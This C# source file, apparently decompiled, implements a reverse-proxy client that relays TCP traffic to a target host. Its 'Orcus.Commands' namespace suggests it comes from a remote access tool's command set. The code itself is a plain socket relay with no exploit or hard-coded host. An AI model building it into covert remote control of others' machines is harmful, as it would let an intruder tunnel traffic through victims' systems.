using System;
using System.Net;
using System.Net.Sockets;
using Orcus.Commands.ReverseProxy.Args;

namespace Orcus.Commands.ReverseProxy;

public class ReverseProxyClient
{
	public const int BUFFER_SIZE = 8192;

	private byte[] _buffer;

	private bool _disconnectIsSend;

	private bool _isDisposed;

	public int ConnectionId { get; }

	public Socket Socket { get; }

	public string Target { get; }

	public int Port { get; }

	public event EventHandler<ReverseProxyStatusUpdatedEventArgs> ResponseStatusUpdate;

	public event EventHandler<ReverseProxyDataReceivedEventArgs> DataReceived;

	public event EventHandler<ReverseProxyEventArgs> Disconnected;

	public ReverseProxyClient(string target, int port, int connectionId)
	{
		ConnectionId = connectionId;
		Target = target;
		Port = port;
		Socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
	}

	public void Initialize()
	{
		Socket.BeginConnect(Target, Port, HandleOnConnect, null);
	}

	private void HandleOnConnect(IAsyncResult ar)
	{
		try
		{
			Socket.EndConnect(ar);
		}
		catch
		{
		}
		if (_isDisposed)
		{
			return;
		}
		if (Socket.Connected)
		{
			try
			{
				_buffer = new byte[8192];
				Socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
			}
			catch
			{
				this.ResponseStatusUpdate?.Invoke(this, new ReverseProxyStatusUpdatedEventArgs(ConnectionId, isConnected: false, null, 0, Target));
				Disconnect();
			}
			IPEndPoint iPEndPoint = (IPEndPoint)Socket.LocalEndPoint;
			this.ResponseStatusUpdate?.Invoke(this, new ReverseProxyStatusUpdatedEventArgs(ConnectionId, isConnected: true, iPEndPoint.Address, iPEndPoint.Port, Target));
		}
		else
		{
			this.ResponseStatusUpdate?.Invoke(this, new ReverseProxyStatusUpdatedEventArgs(ConnectionId, isConnected: false, null, 0, Target));
		}
	}

	private void AsyncReceive(IAsyncResult ar)
	{
		try
		{
			int num = Socket.EndReceive(ar);
			if (_isDisposed)
			{
				return;
			}
			if (num <= 0)
			{
				Disconnect();
				return;
			}
			byte[] array = new byte[num];
			Array.Copy(_buffer, array, num);
			this.DataReceived?.Invoke(this, new ReverseProxyDataReceivedEventArgs(ConnectionId, array));
		}
		catch
		{
			Disconnect();
			return;
		}
		try
		{
			Socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, AsyncReceive, null);
		}
		catch
		{
			Disconnect();
		}
	}

	public void Disconnect()
	{
		if (_isDisposed)
		{
			return;
		}
		_isDisposed = true;
		if (!_disconnectIsSend)
		{
			_disconnectIsSend = true;
			this.Disconnected?.Invoke(this, new ReverseProxyEventArgs(ConnectionId));
		}
		try
		{
			Socket.Close();
		}
		catch
		{
		}
	}

	public void SendToTargetServer(byte[] data, int index, int length)
	{
		try
		{
			Socket.Send(data, index, length, SocketFlags.None);
		}
		catch
		{
			Disconnect();
		}
	}
}
